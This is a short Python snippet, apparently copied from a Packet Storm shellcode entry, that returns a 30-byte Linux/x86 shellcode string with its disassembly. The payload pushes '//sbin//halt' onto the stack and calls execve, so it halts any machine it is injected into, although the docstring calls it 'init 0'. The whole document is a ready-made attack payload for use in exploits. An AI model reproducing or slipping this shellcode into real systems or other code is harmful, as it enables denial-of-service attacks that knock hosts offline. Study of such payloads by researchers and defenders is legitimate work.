#https://packetstormsecurity.com/files/132295/Linux-x86-shutdown-Shellcode.html

def shutdown():
	shellcode =  r"\x31\xc0\x50\x68\x68\x61\x6c"
	shellcode += r"\x74\x68\x69\x6e\x2f\x2f\x68"
	shellcode += r"\x2f\x2f\x73\x62\x89\xe3\x50"
	shellcode += r"\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
	return shellcode


"""
Linux/x86 - Shutdown(init 0) - 30 bytes

00000000  31C0              xor eax,eax
00000002  50                push eax
00000003  6868616C74        push dword 0x746c6168
00000008  68696E2F2F        push dword 0x2f2f6e69
0000000D  682F2F7362        push dword 0x62732f2f
00000012  89E3              mov ebx,esp
00000014  50                push eax
00000015  89E2              mov edx,esp
00000017  53                push ebx
00000018  89E1              mov ecx,esp
0000001A  B00B              mov al,0xb
0000001C  CD80              int 0x80
"""